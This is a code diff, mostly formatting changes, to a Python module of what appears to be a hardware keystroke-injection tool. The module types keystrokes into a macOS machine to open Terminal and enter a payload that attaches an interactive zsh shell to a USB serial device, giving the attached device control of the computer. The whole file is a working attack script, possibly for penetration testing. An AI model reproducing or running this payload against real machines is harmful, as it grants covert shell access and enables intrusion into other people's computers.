@@ -1,11 +1,14 @@
 import time
+
 from pirate.lib.keyboard import Keyboard
-from pirate.lib.serial_console import SerialConsole
 from pirate.lib.logger import Logger
+from pirate.lib.serial_console import SerialConsole
+
 
 def _on_ready() -> None:
     Logger.success("Connected!")
     print("")
+
 
 def execute(baud: int = 115200, show_diagnostics: bool = False) -> None:
     kb = Keyboard()
@@ -17,28 +20,28 @@ def execute(baud: int = 115200, show_diagnostics: bool = False) -> None:
         session_data = 'sleep 0.05; printf "[MAC stty] %s\\r\\n" "$(stty -f /dev/fd/3 -a)" >&3; printf "\\r\\n" >&3;'
 
     payload = (
-        '{'
-        'p=$(ls /dev/tty.usb* 2>/dev/null|head -n1)||exit;'
-        'exec 3<>$p||exit;'
-        f'stty -f /dev/fd/3 {baud} raw -echo -ixon -ixoff||:;'
-        f'{session_data}'
+        "{"
+        "p=$(ls /dev/tty.usb* 2>/dev/null|head -n1)||exit;"
+        "exec 3<>$p||exit;"
+        f"stty -f /dev/fd/3 {baud} raw -echo -ixon -ixoff||:;"
+        f"{session_data}"
         '{ zsh -i <&3 >&3 2>&1; printf "__PIRATE_DONE__\\r\\n" >&3; };'
-        'exec 3>&- 3<&-'
-        '}; exit'
+        "exec 3>&- 3<&-"
+        "}; exit"
     )
-    
+
     # Launch spotlight
     kb.send("{KEY:GUI+SPACE}")
     time.sleep(0.35)
-    
+
     # Launch terminal
     kb.send("terminal{KEY:ENTER}")
     time.sleep(1.0)
 
     # Open a new terminal window
     kb.send("{KEY:GUI+n}")
-    time.sleep(.5)
-    
+    time.sleep(0.5)
+
     # Send the payload
     kb.send(payload)
     kb.send("{KEY:ENTER}")
